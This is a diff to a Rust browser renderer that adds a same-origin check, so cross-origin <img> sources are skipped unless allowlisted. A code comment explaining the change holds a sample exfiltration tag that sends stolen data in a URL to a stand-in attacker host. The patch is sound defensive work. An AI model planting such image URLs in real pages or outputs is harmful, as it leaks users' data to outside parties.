@@ -1123,6 +1123,15 @@ fn layout_children(
                             let scratch = unsafe {
                                 &mut *core::ptr::addr_of_mut!(IMG_SCRATCH)
                             };
+                            // STUMP #104 — Sprint 2.2: same-origin policy on
+                            // <img src=..>. Cross-origin images are the
+                            // single highest-impact exfil vector for the
+                            // renderer (a hostile <img src=https://attacker
+                            // .com/leak?stolen-data> uploads any URL-encoded
+                            // info). Reject unless allowlisted.
+                            if let Err(_e) = crate::security::origin::check_subresource(src) {
+                                continue;
+                            }
                             match crate::net::fetch::fetch_url(src, scratch) {
                                 Ok(n) => {
                                     let slot = crate::browser::media::img_pool::load(&scratch[..n]);
